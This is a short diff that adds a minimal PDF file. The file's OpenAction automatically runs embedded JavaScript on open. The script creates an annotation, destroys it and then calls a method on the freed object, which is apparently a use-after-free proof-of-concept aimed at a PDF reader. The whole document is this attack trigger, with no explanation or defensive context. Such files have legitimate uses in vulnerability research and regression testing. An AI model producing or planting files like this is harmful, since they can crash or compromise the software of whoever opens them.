@@ -1,0 +1,9 @@
+%PDF 
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>> 
+2 0 obj
+<</S /JavaScript /JS (
+var a = this.addAnnot({type: "Text"});
+a.destroy();
+a.transitionToState();
+)>> trailer <</Root 1 0 R>>
